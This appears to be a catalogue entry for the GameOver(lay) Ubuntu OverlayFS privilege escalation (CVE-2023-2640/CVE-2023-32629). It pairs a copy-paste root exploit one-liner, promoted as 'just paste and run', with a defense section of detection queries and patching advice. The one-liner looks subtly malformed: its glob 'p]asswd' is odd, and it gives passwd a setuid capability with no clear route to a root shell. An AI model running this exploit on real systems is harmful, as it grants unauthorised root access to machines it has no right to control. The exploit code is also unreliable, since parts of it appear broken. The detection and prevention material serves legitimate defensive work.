name: GameOver(lay) (CVE-2023-2640/CVE-2023-32629) - Ubuntu OverlayFS Privesc
command: unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p]asswd l/; setcap cap_setuid+eip l/passwd; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/passwd
description: GameOver(lay) exploits Ubuntu-specific patches to OverlayFS (CVE-2023-2640 and CVE-2023-32629) that allow setting privileged extended attributes on files in an overlay filesystem from an unprivileged user namespace. This one-liner grants root on most Ubuntu kernels from 2023. Extremely easy to exploit - just paste and run.
notes:
=== AFFECTED ===
Ubuntu kernels with OverlayFS patches:
- Ubuntu 23.04 (Lunar) - kernel 6.2
- Ubuntu 22.10 (Kinetic) - kernel 5.19
- Ubuntu 22.04 (Jammy) - kernel 5.15-5.19
- Ubuntu 20.04 (Focal) - kernel 5.4 (some versions)
NOT affected: non-Ubuntu distros (they dont have the vuln patches)

=== ONE-LINER EXPLOIT ===
  unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p]asswd l/; setcap cap_setuid+eip l/passwd; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/passwd
  # Instant root!

=== HOW IT WORKS ===
1. unshare -rm creates a user namespace with root inside
2. Copies /usr/bin/passwd and sets cap_setuid capability
3. Mounts an overlay filesystem
4. The overlay trigger copies the capability to the upper dir
5. The capability persists after leaving the namespace
6. Running the capable binary grants root

=== CHECK ===
  uname -r   # Check kernel version
  cat /etc/os-release  # Confirm Ubuntu

defense.why_it_works: Ubuntu-specific OverlayFS patches allowed privileged file capabilities to be set from within unprivileged user namespaces. The capabilities persist on the upper directory files after the overlay is unmounted.
defense.prerequisites: Ubuntu system with vulnerable kernel; user namespaces enabled (default).
defense.impact: Instant root from any unprivileged user; trivial one-liner exploitation.
defense.detection: [MITRE T1068] unshare with overlay mount; setcap in user namespace; file capability changes.
defense.artifacts: Process tree showing unshare -rm; overlay mount events; capability changes on binaries.
defense.splunk_spl:
index=linux sourcetype=syslog ("unshare" AND "overlay") OR ("setcap" AND "cap_setuid")
| table _time, host, process, message
defense.sentinel_kql:
Syslog
| where SyslogMessage has "unshare" and SyslogMessage has "overlay"
| project TimeGenerated, HostName, SyslogMessage
defense.prevention: Apply Ubuntu kernel updates; disable user namespaces if not needed (sysctl kernel.unprivileged_userns_clone=0); monitor for overlay mount abuse.
